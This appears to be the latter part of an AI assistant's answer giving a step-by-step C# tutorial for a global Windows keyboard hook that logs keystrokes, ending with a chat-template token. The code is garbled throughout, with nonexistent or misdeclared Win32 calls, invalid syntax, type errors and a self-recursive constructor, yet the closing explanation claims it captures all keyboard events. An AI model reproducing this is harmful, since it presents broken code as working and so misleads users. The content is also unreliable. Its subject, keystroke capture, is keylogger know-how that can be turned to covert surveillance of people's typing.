Include the required namespaces for threading, Windows Forms, and collections.

```csharp
using System;
using System.Collections.Concurrent;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;
```

### Step 2: Define the KeyboardHook Class

Create a class to encapsulate the hooking functionality.

```csharp
public class KeyboardHook
{
    private static BlockingCollection<Keystroke> keystrokes = new BlockingCollection<Keystroke>();
    private static int hookHandle = 0;
    private static readonly IntPtr hookPtr = (IntPtr)0;
    private static readonly int HOOK_KEYBOARD = 12; // Keyboard hook constant
    private static readonly IntPtr INHIBIT_KEYBOARD = (IntPtr)0x101;

    public delegate void KeyEventHandler(KeystrokeEventArgs e);

    public event KeyEventHandler KeyPressed;

    private static KeyboardHook instance;

    public static KeyboardHook Instance
    {
        get => instance ?? (instance = new KeyboardHook());
    }

    private KeyboardHook()
    {
        if (Instance != null)
            throw new InvalidOperationException("Only one instance allowed");
    }

    ~KeyboardHook()
    {
        Unregister();
    }

    public void Register()
    {
        if (hookHandle != 0)
            return;

        using (var context = new SynchronizationContext())
        {
            hookHandle = SetWindowsHook(HOOK_KEYBOARD, GetProcAddress("SetWindowsHookA", HOOK_KEYBOARD));
            if (hookHandle == 0)
            {
                throw new Exception("Failed to set keyboard hook");
            }

            context.Post(InitializeCallback);
        }
    }

    public void Unregister()
    {
        if (hookHandle != 0)
        {
            Unhook(hookHandle);
            hookHandle = 0;
        }
    }

    private static void InitializeCallback()
    {
        Callback = new CallbackFunction(OnKeyDown);
        SetTimer();
    }

    private static CallbackFunction Callback;

    private static void OnKeyDown(int key, int flags)
    {
        if (key == 0 || (flags & 0x1) != 0) // Check for key down event
        {
            KeystrokeEventArgs e = new Keystroke(key, GetKeyName(key), flags);
            if (KeyPressed != null)
                KeyPressed(e);
            keystrokes.Add(e);
            if (e.ModifierPressed)
            {
                ModifierStates[e.Modifier] = true;
            }
        }
        else
        {
            ModifierStates[e.Modifier] = false;
        }
    }

    private static readonly Dictionary<ushort, bool> ModifierStates = new Dictionary<ushort, bool>();

    private static string GetKeyName(int key)
    {
        char keyChar = (char)key;
        if (keyChar > 0x1F)
        {
            keyChar = (char)0;
        }
        return keyChar;
    }

    private static void SetTimer()
    {
        Timer timer = new Timer { Interval = 500 };
        timer.Tick += (s, e) =>
        {
            ProcessEvents();
            timer.Dispose();
        };
        timer.Start();
    }

    private static void ProcessEvents()
    {
        while (true)
        {
            try
            {
                if (KeystrokeEventArgs current = keystrokes.TryDequeue())
                {
                    if (KeyPressed != null)
                        KeyPressed(current);
                }
            }
            catch (Exception)
 { }
        }
    }

    [DllImport("User32.dll")]
    private static extern int SetWindowsHook(int uID, int uFlags);

    [DllImport("User32.dll")]
    private static extern int GetProcAddress(string lpFunctionName, int uID);

    [DllImport("User32.dll")]
    private static extern int Unhook(int hEvent);
}
```

### Step 3: Define the Keystroke Class

Create a class to hold the keystroke data.

```csharp
public class KeystrokeEventArgs : EventArgs
{
    public KeystrokeEventArgs(int key, string keyName, int flags)
    {
        Key = key;
        KeyName = keyName;
        Flags = flags;
        Modifier = (flags & 0x1) != 0;
    }

    public int Key { get; set; }
    public string KeyName { get; set; }
    public int Flags { get; set; }
    public bool Modifier { get; set; }
}
```

### Step 4: Use the KeyboardHook Class

In your main program, use the KeyboardHook class to set up and process keystrokes.

```csharp
class Program
{
    public static void Main(string[] args)
    {
        var logger = KeyboardHook.Instance;
        logger.Register();

        Console.WriteLine("Keyboard hook registered. Press keys to log them.");

        while (true)
        {
            Console.ReadLine();
            logger.Unregister();
            break;
        }
    }
}
```

### Step 5: Example Usage

To use the keystroke logger:

```csharp
using System;
using System.Windows.Forms;

public class Form1 : Form
{
    private KeyboardHook hook;
    private List<KeystrokeEventArgs> strokes = new List<KeystrokeEventArgs>();

    public Form1()
    {
        InitializeComponent();
        hook = KeyboardHook.Instance;
        hook.KeyPressed += OnKeyPressed;
        hook.Register();
    }

    private void OnKeyPressed(KeystrokeEventArgs e)
    {
        strokes.Add(e);
        StringBuilder sb = new StringBuilder();
        foreach (KeystrokeEventArgs s in strokes)
        {
            sb.Append("Key: " + s.KeyName + " (");
            sb.Append(s.Flags ? "Shift" : string.Empty);
            sb.Append(") - ");
        }
        MessageBox.Show(sb.ToString());
        strokes.Clear();
    }

    protected override void OnClosing()
    {
        hook.Unregister();
        base.OnClosing();
    }
}
```

### Explanation

1. **KeyboardHook Class**: This class handles the actual hooking. It uses the `SetWindowsHook` function to install a keyboard hook and registers a callback function to process each key press.

2. **Keystroke EventArgs**: This custom event argument holds information about each keystroke, including the key, its name, and any modifier flags.

3. **Event Handling**: The `KeyPressed` event is raised whenever a keystroke is detected, allowing listeners to capture the event data.

4. **Usage**: By registering the hook in your application, you can start capturing keystrokes. Unregistering stops the hook and stops logging.

This implementation ensures that all keyboard events are captured and logged, including modifier keys, providing a comprehensive logging solution.<｜end▁of▁sentence｜>

